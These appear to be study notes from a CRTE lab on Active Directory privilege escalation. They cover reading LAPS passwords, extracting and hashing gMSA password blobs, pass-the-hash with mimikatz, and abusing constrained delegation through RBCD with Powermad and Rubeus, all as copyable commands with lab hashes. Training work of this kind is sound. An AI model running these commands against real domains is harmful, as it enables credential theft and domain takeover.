---
title: "2 - AD Privesc"
classes: single
header:  
  teaser: /assets/images/posts/crte/crte-teaser3.jpg
  overlay_image: /assets/images/main/header9.jpg
  overlay_filter: 0.5
ribbon: Firebrick
excerpt: "LAPS, gMSA and Constrained Deleg"
description: "LAPS, gMSA and Constrained Deleg"
categories:
  - notes
  - crte
tags:
  - intermediate
  - AD
  - Windows
  - privesc 
toc: true
---

# AD Privesc

Some content is the same as in CRTP:

[CRTP AD Privilege Escalation](https://johnermac.github.io/notes/crtp/domprivesc/)

## LAPS

LAPS (Local Administrator Password Solution) provides centralized storage of local users passwords in AD with periodic randomizing.

> *…it mitigates the risk of lateral escalation that results when customers have the same administrative local account and password combination on many computers.*

- Storage in clear text, transmission is encrypted (Kerberos).
- Configurable using GPO.
- Access control for reading clear text passwords using ACLs. 
- Only Domain Admins and explicitly allowed users can read the passwords.

![Alt text](/assets/images/posts/crte/1.png){: .align-center}

On a computer, if LAPS is in use, a library AdmPwd.dll can be found in the:
```powershell
C:\Program Files\LAPS\CSE\ directory.
```

**To find users who can read the passwords in clear text machines in OUs**

PowerView:
```powershell
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}
```

**To enumerate OUs where LAPS is in use along with users who can read the passwords in clear text**

Using Active Directory module
```powershell
Get-LapsPermissions.ps1
```

Using LAPS module (can be copied across machines):
```powershell
Import-Module C:\AD\Tools\AdmPwd.PS\AdmPwd.PS.psd1
Find-AdmPwdExtendedRights -Identity OUDistinguishedName
```

**Once we compromise the user which has the Rights, use the following to read clear-text passwords**

PowerView:
```powershell
Get-DomainObject -Identity <targetmachine$> | select - ExpandProperty ms-mcs-admpwd
```

Active Directory module:
```powershell
Get-ADComputer -Identity <targetmachine> -Properties ms-mcs-admpwd | select -ExpandProperty ms-mcs-admpwd
```

LAPS module:
```powershell
Get-AdmPwdPassword -ComputerName <targetmachine>
```


## gMSA

A group Managed Service Account (gMSA) provides automatic password management, SPN management and delegated administration for service accounts across multiple servers.

> Use of gMSA is recommended to protect from Kerberoast type attacks!

- A 256 bytes random password is generated and is rotated every 30 days.
- When an authorized user reads the attribute 'msds-ManagedPassword’ the gMSA password is computed.
- Only explicitly specified principals can read the password blob. 
- Even the **Domain Admins can't read it by default**.

**A gMSA has object class *msDS-GroupManagedServiceAccount*. This can be used to find the accounts**

Using ADModule:
```powershell
Get-ADServiceAccount -Filter *
```

Using PowerView:
```powershell
Get-DomainObject -LDAPFilter '(objectClass=msDS-GroupManagedServiceAccount)'
```

**The attribute *msDS-GroupMSAMembership** (PrincipalsAllowedToRetrieveManagedPassword) lists the principals that can read the password blob**

Read it using ADModule:
```powershell
Get-ADServiceAccount -Identity jumpone -Properties * | select PrincipalsAllowedToRetrieveManagedPassword
```

**The attribute *msDS-ManagedPassword* stores the password blob in binary form of MSDS-MANAGEDPASSWORD_BLOB**

Once we have compromised a principal that can read the blob. Use ADModule to read and DSInternals to compute NTLM hash:
```powershell
$Passwordblob = (Get-ADServiceAccount -Identity jumpone -Properties msDS-ManagedPassword).'msDS-ManagedPassword'
Import-Module C:\AD\Tools\DSInternals_v4.7\DSInternals\DSInternals.psd1
$decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob
ConvertTo-NTHash -Password $decodedpwd.SecureCurrentPassword
```

**The *CurrentPassword* attribute in the $decodedpwd contains the clear-text password but cannot be typed!**

Passing the NTLM hash of the gMSA, we get privileges of the gMSA:
```powershell
sekurlsa::pth /user:jumpone /domain:us.techcorp.local /ntlm:0a02c684cc0fa1744195edd1aec43078
```

**We can access the services and machines (server farms) that the account has access to**


## Golden gMSA

**gMSA password is calculated by leveraging the secret stored in KDS root key object**

We need following attributes of the KDS root key to compute the Group Key Envelope (GKE):
```powershell
- cn
- msKds-SecretAgreementParam
- msKds-RootKeyData
- msKds-KDFParam
- msKds-KDFAlgorithmID
- msKds-CreateTime
- msKds-UseStartTime
- msKds-Version
- msKds-DomainID
- msKds-PrivateKeyLength
- msKds-PublicKeyLength
- msKds-SecretAgreementAlgorithmID
```

- Once we compute the GKE for the associated KDS root key we can generate the password offline.
- Only privilege accounts such as Domain Admins, Enterprise Admins or SYSTEM can retrieve the KDS root key.
- Once the KDS root key is compromised we can’t protect the associated gMSAs accounts.
- Golden gMSA can be used to retrieve the information of gMSA account, KDS root key and generate the password offline.



## Contrained Delegation (Kerberos Only)

> It requires an additional forwardable ticket to invoke S4U2Proxy.

- We cannot use S4U2Self as the service doesn’t have TRUSTED_TO_AUTH_FOR_DELEGATION value configured.

We can leverage RBCD to abuse Kerberos Only configuration:

1. Create a new Machine Account
2. Configure RBCD on the machine configured with Constrained Delegation.
3. Obtain a TGS/Service Ticket for the machine configured with Constrained


Delegation by leveraging the newly created Machine Account:
```powershell
Request a new forwardable TGS/Service Ticket by leveraging the ticket created in previous step.
```


Enumerate constrained delegation using ADModule:
```powershell
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

Since **ms-DS-MachineAccountQuota is set to 10** for all domain users, any domain user can create a new Machine Account and join the same in the current domain.

Create a new Machine Account using Powermad.ps1 script:

[Powermad on GitHub](https://github.com/Kevin-Robertson/Powermad)

```powershell
. C:\AD\Tools\Powermad\Powermad.ps1
New-MachineAccount -MachineAccount studentcompX
```
**We already compromised us-mgmt**

**Configure RBCD** on us-mgmt using us-mgmt$ computer account:
```powershell
C:\AD\Tools\Rubeus.exe asktgt /user:us-mgmt$ /aes256:cc3e643e73ce17a40a20d0fe914e2d090264ac6babbb86e99e74d74016ed51b2 /impersonateuser:administrator /domain:us.techcorp.local /ptt /nowrap
```
Using ADModule:
```powershell
Set-ADComputer -Identity us-mgmt$ -PrincipalsAllowedToDelegateToAccount studentcompX$ -Verbose
```

**Obtain a TGS/Service Ticket** for us-mgmt (machine configured with Constrained Delegation) by leveraging the newly created Machine Account (studentcompx):
```powershell
C:\AD\Tools\Rubeus.exe hash /password:P@ssword@123
C:\AD\Tools\Rubeus.exe s4u /impersonateuser:administrator /user:studentcompX$ /rc4:D3E5739141450E529B07469904FE8BDC /msdsspn:cifs/us-mgmt.us.techcorp.local /nowrap
```

**Request a new forwardable TGS/Service Ticket by leveraging the ticket created in previous step**
```powershell
C:\AD\Tools\Rubeus.exe s4u /tgs:doIGxjCCBsKgAwIBBaEDAgEWoo... /user:us-mgmt$ /aes256:cc3e643e73ce17a40a20d0fe914e2d090264ac6babbb86e99e74d74016ed51b2 /msdsspn:cifs/us-mssql.us.techcorp.local /altservice:http /nowrap /ptt
```

**Access the us-mssql using WinRM as the Domain Admin**:
```powershell
winrs -r:us-mssql.us.techcorp.local cmd.exe
```
